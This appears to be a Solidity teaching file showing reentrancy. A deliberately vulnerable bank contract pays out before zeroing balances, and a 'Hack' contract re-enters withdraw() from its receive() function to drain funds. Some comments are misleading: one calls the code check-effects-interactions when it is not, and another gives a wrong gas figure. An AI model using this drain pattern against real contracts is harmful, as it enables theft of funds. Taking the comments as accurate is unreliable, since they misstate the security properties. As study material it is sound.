// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

contract VulnnerableBank{

   mapping(address=>uint256) balance;

   bool isEntry=true;

   function deposit() external payable {

        balance[msg.sender]+=msg.value;
   }

   //Check-effects-interation pattern

  function withdraw() external payable {

     
     require(balance[msg.sender]>0,"balance not enough");

 

     //(bool r,) =msg.sender.call{value:balance[msg.sender]}("");
     //21000 gas
      payable(msg.sender).transfer(balance[msg.sender]);
      balance[msg.sender]=0;

    // require(r,"tx fail");



  }

  fallback() external payable { }
   receive() external payable { }
}

contract Hack{

   VulnnerableBank bank;
   constructor(VulnnerableBank _bank){
        bank=_bank;
   }

   function hack() external  payable {
      bank.deposit{value:2 ether}();
      bank.withdraw();
   }

   receive() external payable {
      if(address(bank).balance>0){
        bank.withdraw();
      }

    }

    fallback() external payable { }

}